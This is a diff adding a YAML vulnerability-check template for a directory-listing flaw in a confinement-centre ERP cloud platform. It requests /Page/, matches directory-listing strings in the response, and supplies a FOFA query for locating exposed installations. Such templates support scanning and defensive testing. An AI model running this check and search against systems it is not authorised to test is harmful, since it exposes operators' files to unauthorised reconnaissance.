@@ -1,0 +1,24 @@
+id: poc-yaml-jintongfang-erp-page-directory-traversal
+info:
+  name: 月子会所ERP管理云平台 Page 目录遍历漏洞
+  severity: medium
+  tags:
+  - 目录遍历
+  finger: 月子会所ERP管理云平台
+  fofa: app="妈妈宝盒-ERP"
+requests:
+- method: GET
+  path: /Page/
+  expression: 'status_code == 200 &&
+
+    contains(body,"[To Parent Directory]") &&
+
+    contains(body,"<dir&gt") &&
+
+    contains(body,"BasicInfo") &&
+
+    contains(body,"UploadBaseFolder")
+
+    '
+variables: {}
+transport: http
